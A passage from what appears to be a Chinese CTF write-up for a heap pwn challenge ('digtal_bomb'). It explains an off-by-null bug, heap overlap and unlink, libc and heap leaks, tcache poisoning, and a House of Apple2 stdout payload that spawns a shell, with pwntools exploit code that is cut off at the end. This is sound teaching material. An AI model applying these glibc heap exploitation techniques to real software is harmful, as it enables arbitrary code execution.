&#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v0[<span class="number">0</span>] &gt; <span class="number">3</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">            <span class="keyword">if</span> ( v0[<span class="number">0</span>] == <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                add();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( v0[<span class="number">0</span>] != <span class="number">2</span> )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">                delete();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看似菜单给了四个选项，实则选择 4 就会报错。接下来就一个一个分析吧：</p>
+<h5 id="add："><a href="#add：" class="headerlink" title="add："></a>add：</h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-003.png"></p>
+<p>add 函数当中可以输入 idx 和 size，其中限制 size 大小在 0x10-0x800 之间，之后通过 read 往内存写入数据，但是<code>*(_BYTE *)(*((_QWORD *)&amp;unk_4160 + idx) + v4) = 0;</code>会把最后一个字节写为 0，这就是一个典型的 off-by-null 漏洞。</p>
+<h5 id="modify："><a href="#modify：" class="headerlink" title="modify："></a>modify：</h5><p>在一开始有一个 modify 函数，我们可以修改内容，但是只能修改一次，这种类型似乎在哪里见过：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-004.png"></p>
+<p>其余就是很正常的 show 和 delete，show 可以用来泄露数据。</p>
+<h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="泄露-libc-base："><a href="#泄露-libc-base：" class="headerlink" title="泄露 libc_base："></a>泄露 libc_base：</h4><p>libc_base 的泄露十分繁琐，一切归咎于该题不存在 UAF，导致我们无法对已释放的堆块指针进行泄露。那么我们当前的目标就是利用一个 unsortedbin 去泄露 libc_base，但是不存在 UAF 就要求我们去构造堆重叠，覆盖掉未释放的堆指针，最后利用未释放的堆指针进行 show。</p>
+<p>再者考虑到两点：一个是我们只可以对堆内存进行一次的修改，另外是我们堆不存在越界写，这就要求我们必须采取混淆 idx，不断地合并和构造堆块。</p>
+<h5 id="构造基本格局："><a href="#构造基本格局：" class="headerlink" title="构造基本格局："></a>构造基本格局：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x430</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x430</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x480</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">2</span>) </span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-005.png"></p>
+<p>这个时候堆 2 和堆 3 会合并成一个 0x880 的大堆，之后覆盖掉原本 chunk3 的 size 和 prev_size，伪造一个 0x550 大小的 chunk 头，但是保留原堆的 fd 和 bk 指针，然后收回剩余的 bin 内存，但是要注意 idx 的变化：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x430</span> + p64(<span class="number">0</span>) + p32(<span class="number">0x551</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>,payload)  <span class="comment"># 2</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>)          <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x410</span>)          <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x420</span>)          <span class="comment"># 6</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="清理多余的-fd-和-bk-指针："><a href="#清理多余的-fd-和-bk-指针：" class="headerlink" title="清理多余的 fd 和 bk 指针："></a>清理多余的 fd 和 bk 指针：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">3</span>)             <span class="comment"># 0</span></span><br><span class="line">delete(<span class="number">2</span>)             <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>,p64(<span class="number">0</span>))   <span class="comment"># clean fd&amp;bk  0</span></span><br></pre></td></tr></table></figure>
+
+<p>这里清理原先 chunk0 的 fd 和 bk，防止影响后面的内存布局</p>
+<h5 id="伪造第二个堆头："><a href="#伪造第二个堆头：" class="headerlink" title="伪造第二个堆头："></a>伪造第二个堆头：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">6</span>)             <span class="comment"># 6</span></span><br><span class="line">delete(<span class="number">5</span>)             <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x4F8</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x490</span>) <span class="comment"># 5&amp;6合并大堆块的前0x4F8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x3B8</span>)         <span class="comment"># 5&amp;6合并大堆块的后0x3B8</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x418</span>)         <span class="comment"># 3</span></span><br></pre></td></tr></table></figure>
+
+<p>释放 idx 5，6 会构造一个大的合并堆块，这个时候 idx5 和 idx6 还没有被污染，依旧和上述伪造堆头的操作一样，覆盖原先 chunk6 的 prev_size 和 size 然后收回多余的 bin 内存。然后利用 off-by-null 修改低字节的指针</p>
+<p>还记得我们上一个伪造的堆头放在哪里了吗？在原先 chunk3 的堆头，这个时候我们把 idx6 指针指向当前 chunk3 ，这个时候的当前 chunk3 的堆头在原先 chunk3 堆头的 addr-0x20 处，注意区分一下：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-006.png"></p>
+<h5 id="Unlink："><a href="#Unlink：" class="headerlink" title="Unlink："></a>Unlink：</h5><p>我们前面伪造了一个在原先 idx3 的 0x560 大小的堆，在改堆+0x550 处还存在一个大小为 0x500 的堆，倘若我们触发 unlink 去将两个堆合并成一个大 unsortedbin ，我们就可以利用 show 函数去泄露 main_arena。</p>
+<p>考虑一下：0x560 大小肯定是低地址，是合并堆块的前一部分，我们需要在伪造的 0x500 的堆块再伪造一个 prev_size，保证符合 unlink 的条件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">4</span>)             <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x108</span>, <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x100</span> + p64(<span class="number">0x550</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-007.png"></p>
+<p>正好伪造到 0x500 的堆的 prev_size 位，且标志位为 0，标记为空闲</p>
+<h5 id="触发-unlink-读取-libc："><a href="#触发-unlink-读取-libc：" class="headerlink" title="触发 unlink 读取 libc："></a>触发 unlink 读取 libc：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x18</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Show at index 6:\n&quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x21ACE0</span></span><br><span class="line">info(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>
+
+<p>delete3 会触发空闲块合并，前面的堆风水正好绕过 unlink 检测触发堆合并构造了一个大小为 0xa50 的大堆块</p>
+<p>此时我们就可以去泄露 main_arena，但是当前 idx6 指向原先的 chunk3 的位置，其 data 域在伪造堆块的高地址，距离 0x20，因此我们需要再开辟一个新的 0x20 大小的 chunk8，让 unsortedbin 的 bk 和 fd 往高地址挤 0x20 的大小，这样才可以泄漏到 main_arena：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-008.png"></p>
+<p>确实是可以泄露出 libc_base：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-009.png"></p>
+<h4 id="泄露-heap-base"><a href="#泄露-heap-base" class="headerlink" title="泄露 heap_base:"></a>泄露 heap_base:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">9</span>,<span class="number">0x18</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="meta"># gdb.attach(p)</span></span><br><span class="line"><span class="meta"># pause()</span></span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&quot;Show at index 9:&quot;</span>)</span><br><span class="line">leak_info = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">log</span>.success(hex(leak_info))</span><br></pre></td></tr></table></figure>
+
+<p>我们前面利用 add(8,0x18)把整个 unsortedbin 往高地址推了 0x20 个字节，让当前的 chunk6 恰好在 chunk8+0x20 的位置，如果我们再 add(9,0x18)，就会导致 idx6 和 idx9 的指针重叠，当我们 delete(6)的时候会发现堆的实际大小是 0x20，就会把 chunk6&#x2F;9 一同放入 tcachebin</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-010.png"></p>
+<p>同理此时的 chunk9 的 fd 和 bk 指针是有 safe-linking 保护的，但由于 next_chunk &#x3D; 0，其 fd 指针实际就是指针原本地址右移 12 位，其实就是 heap_base：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/pwn/imported/wanqubei-2025-pwn/img-011.png"></p>
+<p>由于 add 函数默认填充一个字节的 a，我们将其去掉即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">heap_base = (leak_info - <span class="number">0xa</span>) * <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">f&#x27;heap_base is ==&gt; <span class="subst">&#123;<span class="built_in">hex</span>(heap_base)&#125;</span>&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+<h4 id="teache-poisioning"><a href="#teache-poisioning" class="headerlink" title="teache poisioning"></a>teache poisioning</h4><p>为了清晰了解当前的对情况，这里直接标注出来：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55a0e6c59290</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000421</span>  <span class="comment"># idx2, size=0x420</span></span><br><span class="line"><span class="number">0x55a0e6c592a0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x000055a0e6c5a5e0</span> </span><br><span class="line"></span><br><span class="line"><span class="number">0x55a0e6c596a0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55a0e6c596b0</span>: <span class="number">0x0000000000000420</span>      <span class="number">0x0000000000000111</span>  <span class="comment"># idx1, prev_size=0x420, size=0x110</span></span><br><span class="line"><span class="number">0x55a0e6c596c0</span>: <span class="number">0x0000000000000061</span>      <span class="number">0x0000000000000000</span> </span><br><span class="line"><span class="number">0x55a0e6c596d0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x55a0e6c597a0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55a0e6c597b0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55a0e6c597c0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000461</span>  </span><br><span class="line"><span class="number">0x55a0e6c597d0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span> </span><br><span class="line"></span><br><span class="line"><span class="number">0x55a0e6c59bf0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span>  </span><br><span class="line"><span class="number">0x55a0e6c59c00</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000021</span>  <span class="comment"># idx8</span></span><br><span class="line"><span class="number">0x55a0e6c59c10</span>: <span class="number">0x00007f41d2010061</span>      <span class="number">0x00007f41d201b260</span> </span><br><span class="line"><span class="number">0x55a0e6c59c20</span>: <span class="number">0x000055a0e6c59c00</span>      <span class="number">0x0000000000000021</span>  <span class="comment"># idx6/idx9 指向的 0x20 chunk header,</span></span><br><span class="line"><span class="number">0x55a0e6c59c30</span>: <span class="number">0x000000055a0e6c59</span>      <span class="number">0x4d032c9985543305</span> </span><br><span class="line"></span><br><span class="line"><span class="number">0x55a0e6c59c40</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000a11</span>  <span class="comment"># unsortedbin chunk header, size=0xa10</span></span><br><span class="line"><span class="number">0x55a0e6c59c50</span>: <span class="number">0x00007f41d201ace0</span>      <span class="number">0x00007f41d201ace0</span> </span><br><span class="line"><span class="number">0x55a0e6c59c60</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span>  </span><br><span class="line"><span class="number">0x55a0e6c59c70</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55a0e6c59c80</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0x55a0e6c5a030</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span> </span><br><span class="line"><span class="number">0x55a0e6c5a040</span>: <span class="number">0x0000000000000420</span>      <span class="number">0x0000000000000111</span>  <span class="comment"># idx4, prev_size=0x420, size=0x110</span></span><br><span class="line"><span class="number">0x55a0e6c5a050</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span>  </span><br><span class="line"><span class="number">0x55a0e6c5a130</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span>  <span class="comment"># idx4 user data 尾部</span></span><br><span class="line"><span class="number">0x55a0e6c5a140</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55a0e6c5a150</span>: <span class="number">0x0000000000000550</span>      <span class="number">0x0000000000000500</span>  <span class="comment"># fake chunk header, prev_size=0x550,</span></span><br><span class="line"><span class="number">0x55a0e6c5a160</span>: <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span>  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0x55a0e6c5a5c0</span>: <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span> </span><br><span class="line"><span class="number">0x55a0e6c5a5d0</span>: <span class="number">0x6161616161616161</span>      <span class="number">0x6161616161616161</span>  </span><br><span class="line"><span class="number">0x55a0e6c5a5e0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000431</span>  <span class="comment"># fake chunk header, size=0x430</span></span><br><span class="line"><span class="number">0x55a0e6c5a5f0</span>: <span class="number">0x000055a0e6c59290</span>      <span class="number">0x00007f41d201ace0</span>  <span class="comment"># fd 指向 idx2 chunk, bk 指向 main_arena</span></span><br><span class="line"><span class="number">0x55a0e6c5a600</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55a0e6c5a610</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到 unsortedbin 虽然是 0xa10 大小的大堆，实际距离 idx4 只有 0x400 的距离，我们申请一个 0x400 大小的堆就可以到 idx4(紧邻但不覆盖)，此时我们再申请一个 0x100 的大小的 chunk 就可以和 idx4 完美堆重叠：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">3</span>, <span class="number">0x3F0</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x100</span>)   <span class="comment"># idx4&amp;idx6</span></span><br></pre></td></tr></table></figure>
+
+<p>我们之后构造一个投毒，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<p>由于 idx4 和 idx6 指针指向的地址相同，我们就可以利用 idx6 取修改已经释放的 idx4，类似 UAF</p>
+<p>将 idx4 的 fd 指针修改为 stdout，完后重新申请填充 payload 打 houseofapple2 的链条获取 shell：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">heap = (heap_base + <span class="number">0x1050</span>) &gt;&gt; <span class="number">12</span></span><br><span class="line">stdout = libc.address + <span class="number">0x21B780</span></span><br><span class="line">fd = stdout ^ heap</span><br><span class="line">edit(<span class="number">6</span>, p64(fd))</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x00</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">        <span class="number">0x08</span>: stdout - <span class="number">0x10</span>,</span><br><span class="line">        <span class="number">0x28</span>: libc.sym[<span class="string">&quot;system&quot;</span>],</span><br><span class="line">        <span class="number">0x88</span>: libc.sym[<span class="string">&quot;_environ&quot;</span>] - <span class="number">0x10</span>,</span><br><span class="line">        <span class="number">0xA0</span>: stdout - <span class="number">0x40</span>,</span><br><span class="line">        <span class="number">0xD8</span>: libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>] - <span class="number">0x20</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&quot;\x00&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x100</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="总-EXP："><a href="#总-EXP：" class="headerlink" title="总 EXP："></a>总 EXP：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./digtal_bomb_patched&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./digtal_bomb_patched&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice &gt;&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt;&gt; \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Size &gt;&gt; \n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice &gt;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt;&gt; \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice &gt;&gt;&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt;&gt; \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Your choice &gt;&gt;&quot;</span>, <span class="string">b&quot;666&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index &gt;&gt; \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Enter min (0-500): &quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Enter max (0-500): &quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Your guess :&quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x430</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x430</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x480</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">2</span>)        <span class="comment"># 2 -&gt; 6 -&gt; 3 -&gt; 0          FIFO</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x430</span> + p64(<span class="number">0</span>) + p32(<span class="number">0x551</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>,payload)  <span class="comment"># 2</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span 